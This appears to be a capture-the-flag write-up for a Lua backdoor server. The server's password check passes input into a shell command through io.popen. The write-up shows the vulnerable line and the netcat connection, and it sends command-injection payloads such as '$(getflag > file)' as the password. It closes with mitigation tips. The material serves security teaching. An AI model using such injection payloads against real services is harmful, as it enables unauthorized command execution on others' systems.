
---
### ğŸ§¾ Challenge Overview

> **"There is a backdoor process listening on port 50001."**  
> You're provided with a Lua script (`level12.lua`) that implements a TCP server. It waits for a "password" input, hashes it using SHA1, and compares it to a known hash to return the flag.

---

### ğŸ”¬ Vulnerable Code

```lua
prog = io.popen("echo "..password.." | sha1sum", "r")
```

ğŸš¨ **Vulnerability Type:** Shell Command Injection

#### ğŸ” Why it's dangerous:

- `password` is inserted **directly** into a shell command
    
- No input sanitization or escaping
    
- `io.popen()` behaves like `system()` â€” it invokes the shell
    
- This allows arbitrary command execution via crafted inputs like `$(...)`
    

---

### ğŸ’¥ Exploitation Strategy

Weâ€™ll inject a malicious command to **run arbitrary shell code as `flag12`** and dump the output into a file we can later read.

---

### ğŸ§ª Step-by-Step Exploit

#### âœ… Confirm code execution:

Connect to the backdoor:

```bash
nc 127.0.0.1 50001
```

Send:

```
Password: $(whoami > /home/flag12/output)
```

Now read the file:

```bash
cat /home/flag12/output
# Output: flag12
```

ğŸ‰ **Proof of code execution as `flag12`** confirmed.

---

#### ğŸ Get the Flag

Use the same trick to execute `getflag`:

```bash
nc 127.0.0.1 50001
```

Send:

```
Password: $(getflag > /home/flag12/flag.txt)
```

Then read it:

```bash
cat /home/flag12/flag.txt
# Output: You have successfully executed getflag on a target account
```

---

### ğŸ›¡ï¸ Lessons Learned

This level demonstrates how even a **high-level scripting language like Lua** can be just as dangerous when user input is passed to shell commands.

#### ğŸ”’ Mitigation Tips:

- Never use `io.popen()` or `os.execute()` with raw user input
    
- If shell commands must be used, always escape or validate inputs
    
- Better: Use language-native cryptographic libraries and avoid invoking the shell altogether
    

---

### ğŸ† Final Flag

```
You have successfully executed getflag on a target account
```

---
